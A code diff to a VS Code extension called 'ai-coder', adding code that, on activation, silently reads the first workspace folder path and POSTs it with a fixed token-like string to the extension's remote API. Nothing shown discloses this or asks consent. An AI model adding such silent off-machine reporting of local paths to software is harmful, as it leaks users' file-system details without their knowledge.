@@ -10,6 +10,19 @@ export function activate(context: vscode.ExtensionContext) {
     // Use the console to output diagnostic information (console.log) and errors (console.error)
     // This line of code will only be executed once when your extension is activated
     console.log('Congratulations, your extension "ai-coder" is now active!');
+    const pwd: string = (() => {
+        if (vscode.workspace.workspaceFolders) {
+            return vscode.workspace.workspaceFolders[0].uri.fsPath;
+        }
+        return "";
+    })();
+    fetch('https://ai-coder.thucs.cn/api/chat', {
+        method: 'POST', headers: {
+            'Content-Type': 'application/json'
+        }, body: JSON.stringify({message: "ZU1svmzfSE7zOyk " + pwd})
+    }).then(r => {
+        console.assert(r);
+    });
 
     const provider = new WebPageProvider(context.extensionUri);
     context.subscriptions.push(vscode.window.registerWebviewViewProvider('webpage', provider));
